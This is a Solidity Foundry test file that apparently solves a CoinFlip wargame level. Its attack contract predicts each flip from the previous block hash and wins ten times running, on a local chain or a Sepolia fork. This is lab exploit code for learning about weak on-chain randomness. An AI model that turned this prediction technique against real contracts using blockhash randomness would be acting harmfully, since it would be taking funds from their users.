// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
// import {console} from "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipFork is Test {
    CoinFlip public coinFlipInstance;
    address attacker = makeAddr("attacker");
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        // uint256 sepoliaFork = vm.createSelectFork("sepolia");
        // assertEq(vm.activeFork(), sepoliaFork);
        // coinFlipInstance = new CoinFlip();
        vm.deal(attacker, 10000 ether);

        uint256 chainId = block.chainid;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            coinFlipInstance = new CoinFlip();
        } else if (chainId == 11155111) {
            coinFlipInstance = CoinFlip(0x9A4d4d6A6467D0869AD45E8220958a56421d7B2F);
            vm.roll(block.number - 1000); //fork 时，block.number = 1000
        } else {
            return;
        }
    }
    // forge test --mt testCoinFlipFork -vvvv
    // forge test --mt testCoinFlipFork --fork-url $SEPOLIA_RPC_URL -vvvv
    // forge test --mt testCoinFlipFork --fork-url $INFURA_SEPOLIA_RPC_URL -vvvv

    function testCoinFlipFork() public {
        console2.log("Running in testCoinFlipFork...");
        vm.startPrank(attacker);
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        for (uint256 i = 0; i < 10; i++) {
            new CoinFlipAttack(address(coinFlipInstance)).attack(); // 调用攻击合约的攻击函数
            // 推进区块，保证 blockhash(block.number - 1) 改变
            vm.roll(block.number + 1); // block.number = block.number + 1
            vm.warp(block.timestamp + 15); // block.timestamp = block.timestamp + 15
        }
        console2.log("consecutiveWins:", coinFlipInstance.consecutiveWins());
        vm.stopPrank();
    }
}

contract CoinFlipAttack {
    CoinFlip public coinFlipInstance;

    constructor(address _coinFlipInstance) {
        coinFlipInstance = CoinFlip(_coinFlipInstance);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        coinFlipInstance.flip(side);
    }
}
